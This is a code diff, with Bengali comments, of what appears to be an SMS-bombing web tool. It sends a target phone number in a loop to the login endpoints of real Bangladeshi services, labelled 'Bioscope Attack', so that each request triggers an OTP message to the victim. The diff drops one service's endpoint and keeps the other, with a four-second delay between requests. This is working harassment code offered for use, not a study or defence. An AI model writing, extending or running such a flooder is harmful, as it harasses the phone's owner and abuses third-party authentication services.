@@ -33,32 +33,26 @@ async function startProcess() {
         return;
     }
 
-    display.innerText = "Attack Started...";
+    display.innerText = "Bioscope Attack Started..."; 
     
     for (let i = 1; i <= count; i++) {
         try { 
-            if (i % 2 !== 0) {
-                // ১. আপনার পাওয়া Apex API
-                await fetch('https://api.apex4u.com/api/auth/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ "phoneNumber": target }), //
-                    mode: 'cors'
-                });
-            } else {
-                // ২. আপনার পাওয়া Bioscope API
-                await fetch('https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ "number": "+88" + target }), // Bioscope এ +88 লাগে
-                    mode: 'cors'
-                });
-            }
+            // শুধুমাত্র আপনার খুঁজে পাওয়া Bioscope POST API
+            await fetch('https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en', { 
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ 
+                    "number": "+88" + target // আপনার পেলোড অনুযায়ী +88 লাগবে
+                }), 
+                mode: 'cors'
+            }); 
 
-            display.innerText = "Sent: " + i;
+            display.innerText = "Sent: " + i; 
             
-            // আপনার সেই ৪ সেকেন্ডের নিরাপদ বিরতি
-            await new Promise(res => setTimeout(res, 4000));
+            // আপনার সেই ৪ সেকেন্ডের বিরতি
+            await new Promise(res => setTimeout(res, 4000)); 
         } catch (e) {
             console.log("Error skipped...");
         }
@@ -87,7 +81,7 @@ function activateCooldown(seconds) {
     }, 1000);
 }
 
-// Matrix Background Animation (আপনার আগের ডিজাইন অনুযায়ী)
+// Matrix Background Animation
 const canvas = document.getElementById('matrix');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth;
